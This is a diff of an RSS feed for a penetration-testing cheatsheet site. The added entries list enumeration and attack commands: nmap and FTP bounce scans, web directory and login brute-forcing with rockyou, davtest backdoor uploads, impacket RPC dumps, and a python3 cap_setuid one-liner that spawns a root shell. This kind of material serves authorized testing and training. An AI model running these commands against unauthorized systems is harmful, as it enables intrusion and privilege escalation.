@@ -2,24 +2,59 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>www.tagnull.de</title>
-    <link>http://localhost:1313/docs/Cheatsheet/enumeration/</link>
+    <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/</link>
     <description>Recent content on www.tagnull.de</description>
     <generator>Hugo</generator>
     <language>en</language>
-    <atom:link href="http://localhost:1313/docs/Cheatsheet/enumeration/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://www.tagnull.de/docs/Cheatsheet/enumeration/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>mail</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/mail/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/mail/</guid>
+      <description> smtp-user-enum # verify that user exists on system with higher delay to make sure we get all responses&#xA;smtp-user-enum -M VRFY -U user-file -t target-ip -m 60 -w 20 </description>
+    </item>
     <item>
       <title>network</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/network/</link>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/network/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/network/</guid>
-      <description>nmap # enumerate services and use default scripts&#xA;nmap -sC -sV -oN normal.txt target-ip scan all tcp ports&#xA;nmap -p- -oN all_ports.txt target-ip scan all udp ports&#xA;nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories&#xA;nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts&#xA;ls -lh /usr/share/nmap/scripts/ nmap through socks4 proxy&#xA;nmap --proxies socks4://proxy-ip:1080 target-ip ftp bounce scan&#xA;nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv massscan # tbd</description>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/network/</guid>
+      <description>nmap # enumerate services and use default scripts&#xA;nmap -sC -sV -oN normal.txt target-ip scan all tcp ports&#xA;nmap -p- -oN all_ports.txt target-ip scan all udp ports&#xA;nmap -p- -sU -oN all_udp_ports.txt target-ip use script categories&#xA;nmap --script vuln,safe,discovery -oN scan.txt target-ip list all nse scripts&#xA;ls -lh /usr/share/nmap/scripts/ nmap through socks4 proxy&#xA;nmap --proxies socks4://proxy-ip:1080 target-ip ftp bounce scan&#xA;nmap -P0 -n -b username:password@target-ip target2-ip --proxies socks4://proxy-ip:1080 -vvvv massscan # todo</description>
     </item>
     <item>
       <title>web</title>
-      <link>http://localhost:1313/docs/Cheatsheet/enumeration/web/</link>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/web/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/docs/Cheatsheet/enumeration/web/</guid>
-      <description> gobuster # </description>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/web/</guid>
+      <description>ferox # basic usage&#xA;feroxbuster -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt gobuster # bruteforce webdirectories and files by extention&#xA;gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 30 wfuzz # bruteforce web parameter&#xA;wfuzz -u http://target-ip/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt bruteforce post data (login)&#xA;wfuzz -u http://target-ip/path/index.php?action=authenticate -d &amp;#39;username=admin&amp;amp;password=FUZZ&amp;#39; -w /usr/share/wordlists/rockyou.txt fuff # bruteforce web directories&#xA;ffuf -w /path/to/wordlist -u https://target/FUZZ davtest # tries to upload (executable) files to webdav&#xA;davtest -url http://target-ip/ -sendbd auto nikto # scan website for vulnerabilities</description>
+    </item>
+    <item>
+      <title>operating system</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/operating-system/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/operating-system/</guid>
+      <description>peass - privilege escalation awesome scripts suite # very easy to use on linux&#xA;./linpeas.sh windows has multiple versions&#xA;winpeasx64.exe winpeasx86.exe winpeas.bat registry entry for winpeas colors&#xA;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 enum4linux # scan target-ip&#xA;enum4linux target-ip rpcdump.py # dump rpc endpoints&#xA;/opt/impacket/examples/rpcdump.py username:password@target-ip lookupsid.py # get sid via rpc&#xA;/opt/impacket/examples/lookupsid.py username:password@target-ip rpcclient # get information via rpc with username&#xA;rpcclient -U username target-ip get information via rpc without username</description>
+    </item>
+    <item>
+      <title>privilege escalation</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/privilege-escalation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/privilege-escalation/</guid>
+      <description> capabilities # exploit cap_setuid capability on python3 to gain a local root-shell&#xA;python3 -c &amp;#39;import os; os.setuid(0); os.system(&amp;#34;/bin/sh&amp;#34;)&amp;#39; </description>
+    </item>
+    <item>
+      <title>smb</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/smb/</guid>
+      <description> mount # mount shares&#xA;mount -o hard,nolock target-ip:/home folder mount -t cifs -o user=username,domain=domainname //target-ip/share /mnt/folder mount -t nfs target-ip:share /mnt/folder -o nolock list Shares&#xA;showmount -e target-ip </description>
+    </item>
+    <item>
+      <title>vulnerabilities</title>
+      <link>https://www.tagnull.de/docs/Cheatsheet/enumeration/vulnerabilities/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://www.tagnull.de/docs/Cheatsheet/enumeration/vulnerabilities/</guid>
+      <description> searchsploit # filter search for specific kernel versions&#xA;searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 </description>
     </item>
   </channel>
 </rss>
